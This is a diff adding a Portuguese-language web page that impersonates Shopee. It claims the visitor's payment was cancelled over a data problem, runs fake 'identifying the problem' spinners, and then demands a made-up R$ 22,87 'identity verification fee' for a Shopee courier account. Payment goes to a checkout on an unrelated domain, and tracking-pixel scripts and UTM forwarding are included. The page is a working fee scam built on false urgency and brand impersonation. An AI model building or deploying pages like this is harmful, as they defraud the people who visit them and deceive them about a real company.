@@ -1,0 +1,264 @@
+<!DOCTYPE html><html lang="pt"><head>
+  <script>  
+    // Script para preservar UTMs em qualquer botão <a> com a classe 'elementor-button-link'  
+    document.addEventListener("DOMContentLoaded", function () {  
+        // Obtém a query string completa da URL atual  
+        const queryParams = window.location.search;  
+
+        // Seleciona todos os links com a classe 'elementor-button-link'  
+        document.querySelectorAll('a.elementor-button-link').forEach(button => {  
+            // Verifica se há parâmetros na query string  
+            if (queryParams) {  
+                const currentUrl = button.getAttribute('href');  
+                const separator = currentUrl.includes('?') ? '&' : '?';  
+                // Atualiza o href de cada link, preservando as UTMs  
+                button.href = currentUrl + separator + queryParams.slice(1);  
+            }  
+        });  
+    });  
+</script>  
+
+</script>  
+<script>  
+    document.addEventListener("DOMContentLoaded", function () {  
+        // Obtém a query string completa da URL atual  
+        const queryParams = window.location.search;  
+
+        // Verifica se existem parâmetros UTM  
+        if (queryParams) {  
+            // Atualiza o href de todos os links com a classe 'elementor-button-link'  
+            document.querySelectorAll('a.elementor-button-link').forEach(button => {  
+                const currentUrl = button.getAttribute('href') || '';  
+                // Se currentUrl não estiver vazio, adiciona os parâmetros UTM  
+                if (currentUrl) {  
+                    const separator = currentUrl.includes('?') ? '&' : '?';  
+                    button.href = currentUrl + separator + queryParams.slice(1);  
+                }  
+            });  
+            
+            // Atualiza o href de todos os botões de ação  
+            document.querySelectorAll('.btn-simple').forEach(button => {  
+                button.onclick = function() {  
+                    const currentUrl = button.getAttribute('onclick').match(/location.href='([^']+)'/)[1];  
+                    if (currentUrl) {  
+                        const separator = currentUrl.includes('?') ? '&' : '?';  
+                        button.onclick = function() {  
+                            window.location.href = currentUrl + separator + queryParams.slice(1);  
+                        }  
+                    }  
+                };  
+            });  
+        }  
+    });  
+</script>
+  <meta charset="utf-8">
+  <script>
+    window.pixelId = "681a75cec35f63e058203199";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
+<script
+src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+data-utmify-prevent-xcod-sck
+data-utmify-prevent-subids
+async
+defer
+></script>
+  <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
+  <title>URGENTE</title>
+  <link href="./css/mCl9PfSJFtxo.css" rel="stylesheet">
+  <link href="./css/hiPY2SupfkZx.css" rel="stylesheet">
+  <link href="./css/YQzKCGhU9jtT.css" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@24,400,0,0" rel="stylesheet">
+  <style>
+    .popup {
+      position: fixed;
+      top: 20px;
+      left: 50%;
+      transform: translateX(-50%);
+      background-color: #222;
+      color: #fff;
+      padding: 20px;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.5);
+      z-index: 9999;
+      display: none;
+    }
+    .popup button {
+      background-color: #ff4444;
+      color: white;
+      border: none;
+      padding: 5px 10px;
+      margin-top: 10px;
+      cursor: pointer;
+    }
+    .popup {
+      background-color: #ffcccc !important;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important;
+      color: #660000 !important;
+    }
+    .popup button {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif !important;
+    }
+  </style>
+
+<script>
+window.pixelId = "681a75cec35f63e058203199";
+var a = document.createElement("script");
+a.setAttribute("async", "");
+a.setAttribute("defer", "");
+a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+document.head.appendChild(a);
+</script>
+</head>
+<body>
+
+  <audio autoplay="" id="popupSound">
+    <source src="./media/aVosDfMDUVa9.ogg" type="audio/ogg">
+  </audio>
+
+  <script>
+    window.onload = function () {
+      var popup = document.getElementById('popup');
+      var sound = document.getElementById('popupSound');
+      popup.style.display = 'block';
+      if (sound) {
+        sound.play().catch(() => {});
+      }
+    }
+  </script>
+
+
+  <nav class="navbar" style="background-color: white; padding-top: 15px; display: flex; justify-content: center; align-items: center;">
+    <div class="menu-icon"></div>
+      <img alt="Logo Central Vivara" src="./images/logoviva.png" style="height: 10vh;">
+    </div>
+  </nav>
+
+  <div id="ad1">
+    <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Sua conta</p>
+    <div class="ad1">
+      <div style="margin-left: 3%; margin-right: 3%;">
+        <button class="styled-button">
+          <span class="button-text">
+            <span class="button-title">#SHOPEE1321903</span>
+          </span>
+        </button>
+
+        <div class="entrega-container">
+          <div class="entrega-header">Status</div>
+          <div class="entrega-content">
+            <div class="icon-container2">
+              <span class="material-symbols-outlined">check</span>
+            </div>
+            <div class="text-container">
+              <div class="entrega-title">Pagamento em análise</div>
+            </div>
+          </div>
+          <div class="entrega-content">
+            <div class="icon-container3">
+              <span class="material-symbols-outlined">warning</span>
+            </div>
+            <div class="text-container">
+              <div class="entrega-title">Pendência no pagamento</div>
+            </div>
+          </div>
+        </div>
+
+        <p style="text-align: center; margin-left: 3%; margin-right: 3%;">Seu pagamento foi cancelado, foi encontrado uma pendência no seus dados com a Shopee. Clique abaixo para resolver esse problema!</p>
+
+        <div class="button-container" style="padding-bottom: 20px;">
+          <button class="styled-button2" onclick="showAd2()">
+            <span class="button-text">
+              <span class="button-title2">Resolver problema</span>
+            </span>
+            <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+          </button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div id="ad2" style="display: none;">
+    <p style="margin-left: 5%; font-family: 'GellixMedium'; font-size: 22px;">Problemas no pedido</p>
+    <div class="ad2" style="padding-top: 15px; padding-bottom: 15px;">
+      <div class="loading" id="loadingGif"><div class="spinner"></div></div>
+
+      <div class="entrega-container hidden" id="text1">
+        <div class="entrega-content">
+          <div class="icon-container2"><span class="material-symbols-outlined">settings</span></div>
+          <div class="text-container">
+            <div class="entrega-title">Estamos identificando o problema na sua conta!</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="loading hidden" id="loadingGif2"><div class="spinner"></div></div>
+
+      <div class="hidden entrega-container" id="text2" style="margin-top: 15px;">
+        <div class="entrega-content">
+          <div class="icon-container2" style="background-color: red;">
+            <span class="material-symbols-outlined">warning</span>
+          </div>
+          <div class="text-container">
+            <div class="entrega-title">Identificamos uma inconsistência nos dados fornecidos durante o cadastro.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="loading hidden" id="loadingGif3" style="padding-top: 20px;">
+        <div class="spinner"></div>
+      </div>
+
+      <div class="hidden entrega-container" id="text3" style="background-color: #d40303; margin-top: 15px;">
+        <div class="entrega-content">
+          <div class="icon-container2" style="background-color: rgb(255, 255, 255);">
+            <span class="material-symbols-outlined" style="color: #d40303;">priority_high</span>
+          </div>
+          <div class="text-container">
+            <div class="entrega-title" style="color: white;">
+              Para que sua conta de entregador Shopee seja ativada com prioridade, é necessário o pagamento de uma <b>Taxa de Verificação de Identidade (TVI)</b>. Esta taxa única, no valor de <b>R$ 22,87</b>, garante a conformidade com as políticas de segurança e validação antifraude da plataforma.
+            </div>
+            
+            
+          </div>
+        </div>
+      </div>
+
+      <script>
+        function openNewWindowWithUTMs(url) {
+          const currentUrlParams = new URLSearchParams(window.location.search);
+          let utms = '';
+          for (let [key, value] of currentUrlParams.entries()) {
+            if (key.startsWith('')) {
+              utms += `${key}=${value}&`;
+            }
+          }
+          if (utms) utms = utms.slice(0, -1);
+          const fullUrl = url + (utms ? '?' + utms : '');
+          window.open(fullUrl, '_blank');
+        }
+      </script>
+
+      <!-- ✅ BOTÃO CORRIGIDO AQUI -->
+      <div class="button-container hidden" id="finalButton" style="padding-top: 15px;">
+    <button class="styled-button2" onclick="window.location.href='https://pay.compraeguraapay.com.br/checkout/edf23c12-29b3-4218-8343-5b8e8727b971'">
+          <span class="button-text">
+            <span class="button-title2">Pagar o TVI</span>
+          </span>
+          <span class="material-symbols-outlined" style="font-size: 32px;">arrow_forward_ios</span>
+        </button>
+      </div>
+
+      <div style="padding-bottom: 2px;"></div>
+    </div>
+  </div>
+
+  <script src="./js/mX5akI3upAiE.js"></script>
+
+
+
+</body></html>
